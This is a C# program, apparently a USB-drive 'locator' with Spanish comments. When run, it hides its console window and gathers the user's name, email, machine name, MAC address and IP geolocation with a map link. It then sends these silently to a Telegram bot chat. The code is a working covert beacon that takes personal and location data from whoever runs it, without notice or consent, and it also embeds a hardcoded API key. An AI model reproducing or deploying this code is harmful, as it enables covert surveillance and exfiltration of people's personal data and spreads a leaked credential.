using System;
using System.Management;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;
using Telegram.Bot;
using System.DirectoryServices.AccountManagement;
using Microsoft.Win32;
using Newtonsoft.Json;

class UsbLocator
{

    // Importa la función SetConsoleWindowInfo desde la biblioteca kernel32 para poder ocultar la ventana.
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0; // Oculta la ventana
    private const int SW_SHOW = 5; // Muestra la ventana

    /***
     * Método principal del programa.
     */
    public static async Task Main(String[] args)
    {

        var config = new Config();
        
        // Cargar la configuración desde el archivo JSON
        try
        {
            var configJson = File.ReadAllText("config.json");
            config = JsonConvert.DeserializeObject<Config>(configJson);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error al cargar la configuración: {ex.Message}");
        }
        
        try
        {
            // Si el dispositivo es Windows, oculta la ventana.
            // Obtiene el identificador de la ventana de consola actual y la oculta para que el usuario no la vea.
            if (GetTipoDispositivo().Equals("Windows"))
            {
                IntPtr consoleWindow = GetConsoleWindow();
                ShowWindow(consoleWindow, SW_HIDE);
            }


            //Construye el mensaje a enviar.
            var mensaje = "🚨 DISPOSITIVO USB DETECTADO 🚨\n";
            mensaje += ObtenerDatosSistema();
            mensaje += ObtenerDatosUsuario(Environment.UserName);
            mensaje += ObtenerDatosUbicacion();

            //Envia el mensaje por telegram con los datos.
            await EnviarMensajeTelegram(config.TelegramAdminChatId, mensaje, config.TelegramBotToken);
            Console.WriteLine(mensaje);
        }
        catch (Exception ex) 
        {
            await EnviarMensajeTelegram(config.TelegramAdminChatId,ex.Message, config.TelegramBotToken);
        }
    }

    /***
     * Método que devuelve un string con los datos del sistema.
     */
    private static string ObtenerDatosSistema()
    {
        var datosSistema = "\n🖥 DATOS DEL SISTEMA\n";
        
        datosSistema += $"-Usuario: {Environment.UserName}\n";
        datosSistema += $"-Tipo de SO: {GetTipoDispositivo()}\n";
        datosSistema += $"-Dirección MAC: {GetDireccionMac()}\n";
        datosSistema += $"-Nombre del equipo: {Environment.MachineName}\n";
        datosSistema += $"-Arquitectura del procesador: {GetArquitecturaProcesador()}\n";

        return datosSistema;
    }

    /***
     * Método que obtiene los datos del usuario a partir del username.
     */
    /***
 * Método que obtiene los datos del usuario local a partir del nombre de usuario.
 */
    private static string ObtenerDatosUsuario(string username)
    {
        var datosUsuario = "\n👤 DATOS DEL USUARIO\n";

        // Si el dispositivo es Windows.
        if (GetTipoDispositivo().Equals("Windows"))
        {
            // Crea un objeto PrincipalContext para el contexto local.
            using (PrincipalContext context = new PrincipalContext(ContextType.Machine))
            {
                // Buscar el usuario por nombre de usuario.
                UserPrincipal user = UserPrincipal.FindByIdentity(context, IdentityType.SamAccountName, username);

                if (user != null)
                {
                    // Obtiene los datos y los agrega al string principal.
                    string email = user.EmailAddress;
                    datosUsuario += $"-Nombre y apellidos: {user.GivenName} {user.Surname}\n";
                    datosUsuario += $"-Email: {user.EmailAddress}\n";
                }
                else
                {
                    Console.WriteLine("No se encontró el usuario.");
                }
            }
        }
        else
        {
            datosUsuario += "No se encontró información del usuario.\n";
        }

        return datosUsuario;
    }

    /***
     * Método que devuelve un string con los datos de la ubicación.
     */
    private static string ObtenerDatosUbicacion()
    {
        try
        {
            //Define los datos necesarios para hacer la petición a la API de IPAPI.
            var apiKey = "8PVOe3AA4S1hjIMdV0FSmtvjRyJGwPTw2ATwFAdkLeh6ZZLIFS"; // Reemplaza con tu propia API key de ipstack
            string url = $"https://ipapi.co/json/?key={apiKey}";

            //Hace la petición a IPStack y lee el JSON de respuesta para obtener los datos necesarios.
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = client.GetAsync(url).Result;

                if (response.IsSuccessStatusCode)
                {
                    string jsonResponse = response.Content.ReadAsStringAsync().Result;
                    JObject data = JObject.Parse(jsonResponse);

                    string datosUbicacion = "\n📍 DATOS DE UBICACIÓN\n";
                    datosUbicacion += $"-Dirección IP: {data["ip"]}\n";
                    datosUbicacion += $"-ISP: {data["org"]}\n";
                    datosUbicacion += $"-País: {data["country_name"]} {data["country_flag_emoji"]}\n";
                    datosUbicacion += $"-Región: {data["region"]}\n";
                    datosUbicacion += $"-Ciudad: {data["city"]}\n";
                    datosUbicacion += $"-Código postal: {data["postal"]}\n";
                    datosUbicacion += $"-Latitud: {data["latitude"]}\n";
                    datosUbicacion += $"-Longitud: {data["longitude"]}\n";

                    string latitud = data["latitude"].ToString().Replace(",", ".");
                    string longitud = data["longitude"].ToString().Replace(",", ".");
                    string mapsUrl = $"https://www.google.com/maps?q={latitud},{longitud}";

                    datosUbicacion += $"-URL de Google Maps: {mapsUrl}\n";

                    return datosUbicacion;
                }
                else
                {
                    Console.WriteLine("Error: " + response.StatusCode);
                    return "Error al hacer la petiición HTTP.";
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error al obtener los datos de ubicación: " + ex.Message);
            return string.Empty;
        }
    }

    /***
     * Método que obtiene la arquitectura del procesador del equipo.
     */
    private static string GetArquitecturaProcesador()
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            var envVar = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            if (!string.IsNullOrEmpty(envVar))
            {
                return envVar;
            }
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
        {
            var command = "uname";
            var arguments = "-p";
            return ExecuteCommand(command, arguments);
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
        {
            var command = "sysctl";
            var arguments = "-n machdep.cpu.brand_string";
            return ExecuteCommand(command, arguments);
        }

        return "Desconocido";
    }


    /***
     * Método que envía un mensaje a través de Telegram.
     */
    public static async Task EnviarMensajeTelegram(string chatId, string mensaje, string botToken)
    {
        try
        {
            var botClient = new TelegramBotClient(botToken);

            await botClient.SendTextMessageAsync(chatId, mensaje);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error al enviar el mensaje a Telegram: " + ex.Message);
        }
    }

    /**
     * Método que obtiene el tipo de dispositivo (Windows, Linux o macOS).
     */
    public static string GetTipoDispositivo()
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            return "Windows";
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
        {
            return "Linux";
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
        {
            return "macOS";
        }

        return "Desconocido";
    }

    /***
     * Método que obtiene la dirección MAC del dispositivo.
     */
    private static string GetDireccionMac()
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus == OperationalStatus.Up && !nic.Description.ToLower().Contains("virtual"))
                {
                    return nic.GetPhysicalAddress().ToString();
                }
            }
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
        {
            try
            {
                string command = "/sbin/ifconfig";
                string arguments = "-a";

                string output = ExecuteCommand(command, arguments);

                int startIndex = output.IndexOf("ether ") + 6;
                int endIndex = output.IndexOf(" ", startIndex);

                if (startIndex >= 6 && endIndex > startIndex)
                {
                    return output.Substring(startIndex, endIndex - startIndex);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error al obtener la dirección MAC: " + ex.Message);
            }
        }

        return "Desconocido";
    }

    /***
     * Método que ejecuta un comando en el sistema.
     */
    private static string ExecuteCommand(string command, string arguments)
    {
        using (var process = new System.Diagnostics.Process())
        {
            process.StartInfo.FileName = command;
            process.StartInfo.Arguments = arguments;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
            var output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            return output.Trim();
        }
    }
}

public class Config
{
    public string TelegramAdminChatId { get; set; }
    public string TelegramBotToken { get; set; }
}
